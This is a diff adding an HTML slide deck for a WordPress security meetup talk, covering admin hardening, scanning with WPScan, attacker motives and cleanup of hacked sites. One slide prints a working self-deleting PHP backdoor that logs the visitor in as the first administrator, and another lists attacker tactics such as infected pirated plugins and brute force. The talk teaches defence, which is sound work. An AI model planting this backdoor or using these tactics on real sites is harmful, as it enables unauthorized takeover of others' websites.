@@ -1,0 +1,391 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Hacking (and secure) a WordPress site!</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/codeat.css" id="theme">
+		<link rel="Shortcut Icon" href="https://i2.wp.com/codeat.co/wp-content/uploads/2016/02/cropped-small-logo.png?fit=32%2C32&#038;ssl=1" type="image/x-icon" />
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/freezeframe_styles.min.css">
+		<link rel="stylesheet" href="lib/css/github.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+            var link = document.createElement('link');
+            link.rel = 'stylesheet';
+            link.type = 'text/css';
+            link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+            document.getElementsByTagName('head')[0].appendChild(link);
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+		<div class="barra"><div class="titolo"></div><div class="logo"></div></div>
+		<div class="barra bottom"><div class="titolo">Daniele Scasciafratte - WP Teramo</div><div class="hashtag">@wpteramo</div></div>
+		<div class="reveal">
+
+			<div class="slides">
+				<section>
+					<h1>Hacking (and secure) a WordPress site!</h1>
+					<h3>How to sleep well and not cry in a corner</h3>
+					<p>
+						<small>Created by <a href="https://daniele.tech">Daniele Scasciafratte</a></small>
+					</p>
+				</section>
+
+				<section data-transition="slide" data-background="pictures/hello.gif">
+					<div class="background">
+						<h2 class="white-black-shadow">Daniele Scasciafratte</h2>
+						<ul class="white-black-shadow">
+							<li>Co Founder/CTO Codeat</li>
+							<li>Open Source Addicted</li>
+							<li>WordPress Core Contributor/Developer</li>	
+							<li>ClassicPress Founding Committee</li>						
+							<li>WordPress Rome/Terni meetup</li>
+							<li>Mozillian & Mozilla Reps & Mozilla TechSpeaker</li>
+							<li>Industria Italiana Software Libero Presidente</li>
+						</ul>
+					</div>
+				</section>
+
+				<section>
+					<div style="margin-top: -20px;">
+						<img src="pictures/cry/sheldon.gif"/>
+						<img src="pictures/cry/hobbit.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/homealone.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/spiderman.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/homer.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/superman.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/stanlioollio.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/starwars.gif" style="max-width: 300px;"/>
+						<img src="pictures/cry/stitch.gif" style="max-width: 300px;"/>
+					</div>
+				</section>
+
+				<section>
+					<div>
+						<h2 class="white-black-shadow">Who is an hacker?</h2>
+						<blockquote>
+							Persona che si diverte ad esplorare i dettagli dei sistemi di programmazione e come espandere le loro capacità, a differenza di molti utenti, che preferiscono imparare solamente il minimo necessario.
+						</blockquote>
+						<blockquote>
+							Person who likes to explore the details of the technology systems and how to extend their skills, unlike many users, who prefer to learn only the minimum necessary.
+						</blockquote>
+					</div>
+				</section>
+
+				<section>
+					<h3>Hackers are professionals</h3>
+					<img src="pictures/lamer.gif" class="full">
+				</section>
+
+				<section>
+					<h3>We are the Angela's of IT</h3>
+					<img src="pictures/sparatagrossa.gif" class="full">
+				</section>
+
+				<section class="force-bottom">
+					<img src="pictures/noncredo.gif" class="full">
+					<div class="background fragment">
+						<h3 class="white-black-shadow">Serious time!</h3>
+						<p>
+							An Hacker want to explain how he/she achieved the results to improve the technology but also itself and the others.
+						</p>
+					</div>
+				</section>
+
+				<section>
+					<h3>Let's start with culture time!</h3>
+					<img src="pictures/intro.gif" class="full">
+				</section>
+
+				<section class="force-bottom">
+					<img src="pictures/stats.png">
+					<blockquote>
+						<a href="https://w3techs.com/technologies/details/cm-wordpress/all/all">https://w3techs.com/technologies/details/cm-wordpress/all/all</a>
+					</blockquote>
+				</section>
+
+				<section>
+						<h3>First steps for a normal user</h3>
+						<ul>
+							<li>Password</li>
+							<li>Yes a difficult password</li>
+							<li>What do you think that an user need?</li>
+						</ul>
+				</section>
+
+				<section>
+						<h3>Often the bugs are in <b>plugin</b>s</h3>
+						<ul>
+							<li>Missing sanitizations</li>
+							<li>Features for logged users available to non-logged</li>
+							<li>Non-standard
+								<ul>
+									<li>UI</li>
+									<li>Custom stuff that doesn't use the WordPress framework</li>
+									<li>Reimplementation of already available WP features</li>
+								</ul>
+							</li>
+						</ul>
+				</section>
+
+				<section>
+						<h3>Golden rules for an administrator</h3>
+						<ul>
+							<li class="fragment">Block access to <b>wp-admin</b></li>
+							<li class="fragment">Block File browsing from web servers</li>
+							<li class="fragment">Update always WordPress and plugins
+								<ul>
+									<li>Especially premium stuff from marketplaces</li>
+								</ul>
+							</li>
+							<li class="fragment">Block comments and other interactions for non-logged users</li>
+							<li class="fragment">Check file permissions</li>
+							<li class="fragment">Ban bots and bad IPs</li>
+							<li class="fragment">Enable protection for brute force</li>
+							<li class="fragment">Remove the user 1 (admin)</li>
+							<li class="fragment">Block XML-RPC/REST API if you don't need</li>
+						</ul>
+				</section>
+
+				<section>
+						<h3>Golden rules for an hacker</h3>
+						<ul>
+							<li class="fragment">Check version of plugins</li>
+							<li class="fragment">Create infected warez version of premium plugins/themes <a href="https://tareq.co/2018/10/i-installed-a-pirated-theme/">(example)</a></li>
+							<li class="fragment">Invest a lot of time on <b>admin-ajax.php</b>
+								<ul>
+									<li>Generate DDOS</li>
+									<li>Actions for logged/non users</li>
+									<li>Missing <b>nonce</b>s or <a href="https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/">wrongly integrated</a></li>
+									<li>Abuse this calls (100000+ installation plugin <a href="https://www.wordfence.com/blog/2018/11/trends-following-vulnerability-in-wp-gdpr-compliance-plugin/">example</a>, <a href="https://blog.sucuri.net/2018/11/hackers-change-wordpress-siteurl-to-pastebin.html">example</a>)</li>
+								</ul>
+							</li>
+							<li class="fragment">Look for premium plugins not updated</li>
+							<li class="fragment">Look around for XSS</li>
+							<li class="fragment">Check for <a href="https://codeseekah.com/2012/04/09/why-wordpress-authentication-unique-keys-and-salts-are-important/">not defined SALT</a></li>
+							<li class="fragment">Check if <a href="https://www.wordfence.com/blog/2017/07/wpsetup-attack/">WordPress is not installed</a></li>
+						</ul>
+				</section>
+
+				<section>
+					<h3>Tools time</h3>
+					<img src="pictures/superhero.gif" class="full">
+				</section>
+
+				<section id="fragments">
+					<h2>Online tools</h2>
+					<ul>
+						<li><a href="https://sitecheck.sucuri.net">https://sitecheck.sucuri.net</a></li>
+						<li><a href="https://observatory.mozilla.org/">https://observatory.mozilla.org/</a></li>
+						<li><a href="https://wploop.com/wordpress-security-online-scanner/">https://wploop.com/wordpress-security-online-scanner/</a></li>
+						<li><a href="https://wpvulndb.com/">https://wpvulndb.com/</a></li>
+						<li>Speed tester</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>We are forgetting the real tools</h3>
+					<img src="pictures/ascii_dog.gif">
+				</section>
+
+				<section>
+					<h2>WP CLI Checksum</h2>
+					<img src="pictures/wpcli.png">					
+				</section>
+				
+				<section>
+					<h2>WPScan</h2>
+					<ul>
+						<li class="fragment">Enumerate plugins and also versions
+							<ul>
+								<li>If exploitable</li>
+								<li>Common misconfiguration</li>
+								<li>Other informations</li>
+							</ul>
+						</li>
+						<li class="fragment">Enumerate users</li>
+						<li class="fragment">Brute force usernames</li>
+						<li class="fragment">Request with a long timeout or with throttling</li>
+						<li class="fragment">Random user agent</li>
+						<li class="fragment">Multiple threads</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>First commands to run</h2>
+					<pre><code data-trim>
+wpscan --url www.example.com
+wpscan --url www.example.com --enumerate
+					</code></pre>
+					<p>Only 2 commands are enough to understand if the website is managed with a <b>professional</b> behaviour or not.</p>
+				</section>
+
+				<section>
+					<h2>WPSeku</h2>
+					<ul>
+						<li class="fragment">Rewritten WPScan in Python</li>
+						<li class="fragment">Focus on plugin code (if in wp.org repo)
+							<ul>
+								<li>For XSS</li>
+								<li>For use of critical methods</li>
+							</ul>
+                        </li>
+						<li class="fragment">Brute force usernames also for XML-RPC</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>No other cli tools</h2>
+					<img src="pictures/penso.jpg">
+				</section>
+
+				<section>
+					<h2>Cool stuff</h2>
+					<img src="pictures/tapiro.jpg">
+				</section>
+
+				<section>
+					<h2>Backdoor</h2>
+					<pre><code data-trim>
+@unlink(__FILE__);
+
+require('../../../wp-blog-header.php');
+require('../../../wp-includes/pluggable.php');
+$user_info = get_userdata(1);
+// Automatic login //
+$username = $user_info->user_login;
+$user = get_user_by('login', $username );
+// Redirect URL //
+if ( !is_wp_error( $user ) )
+{
+    wp_clear_auth_cookie();
+    wp_set_current_user ( $user->ID );
+    wp_set_auth_cookie  ( $user->ID );
+
+    $redirect_to = user_admin_url();
+    wp_safe_redirect( $redirect_to );
+
+    exit();
+}
+					</code></pre>
+					<p><a href="https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php">https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/backdoor_admin_access.php</a></p>
+				</section>
+
+				<section>
+					<h2>Fix an hacked website</h2>
+					<ul>
+						<li class="fragment">Download everything locally</li>
+						<li class="fragment">Download a clean version of
+							<ul>
+								<li>WordPress</li>
+								<li>Every plugins</li>
+								<li>Every themes</li>
+							</ul>
+						</li>
+						<li class="fragment">Search for php files in <b>wp-content/uploads/*.php</b></li>
+						<li class="fragment">Search for files with strange date of last edit</li>
+						<li class="fragment">Compare your clean/hacked version with a diff tool
+							<ul>
+								<li>Sometimes there are files renamed like <b>class-ftp-inc.php</b></li>
+								<li>Sometimes there is obfuscated code prepended in few/all the files</li>
+							</ul>
+						</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Why I want to hack your website?</h2>
+					<ul>
+						<li class="fragment">Ransom (data, files, domain, server)</li>
+						<li class="fragment">Scam
+							<ul>
+								<li>Redirects</li>
+								<li>Search Engine Ranking</li>
+							</ul>
+						</li>
+						<li class="fragment">Phishing</li>
+						<li class="fragment">Malware (server, visitors)</li>
+						<li class="fragment">Access to Server Resources (mining)</li>
+						<li class="fragment">SPAM</li>
+						<li class="fragment">Other services in the server</li>
+						<li class="fragment">Fun</li>
+					</ul>
+				</section>
+
+				<section>
+					<h2>Plugins suggested to improve the security</h2>
+					<ul>
+						<li>iThemes Security</li>
+						<li>Wordfence Security</li>
+					</ul>
+				</section>
+
+				<section style="text-align: left;">
+					<h2>Grazie!</h2>
+					<img src="pictures/grazie.jpg">
+					<p>
+						- <a href="http://mte90.tech/Talk-Secure-WP">http://mte90.tech/Talk-Secure-WP</a>
+					</p>
+				</section>
+
+			</div>
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+		<script src="lib/js/freezeframe.pkgd.min.js"></script>
+		<script src="js/gif.js"></script>
+
+		<script>
+
+            Reveal.initialize({
+              controls: false,
+              progress: true,
+              history: true,
+              center: true,
+              touch: true,
+              overview: false,
+              transition: 'zoom', // none/fade/slide/convex/concave/zoom
+			  keyboard: {
+				78: function () {animateGif() },
+				34: function () {animateGif() },
+				76: function () {animateGif() },
+				39: function () {animateGif() },
+				74: function () {animateGif() },
+				40: function () {animateGif() }
+			  },
+              dependencies: [
+                {src: 'lib/js/classList.js', condition: function () {
+                    return !document.body.classList;
+                  }},
+                {src: 'plugin/markdown/marked.js', condition: function () {
+                    return !!document.querySelector('[data-markdown]');
+                  }},
+                {src: 'plugin/markdown/markdown.js', condition: function () {
+                    return !!document.querySelector('[data-markdown]');
+                  }},
+                {src: 'plugin/highlight/highlight.js', async: true, condition: function () {
+                    return !!document.querySelector('pre code');
+                  }, callback: function () {
+                    hljs.initHighlightingOnLoad();
+                  }},
+              ]
+            });
+
+            document.querySelector('.titolo').textContent = document.title;
+
+		</script>
+
+	</body>
+</html>
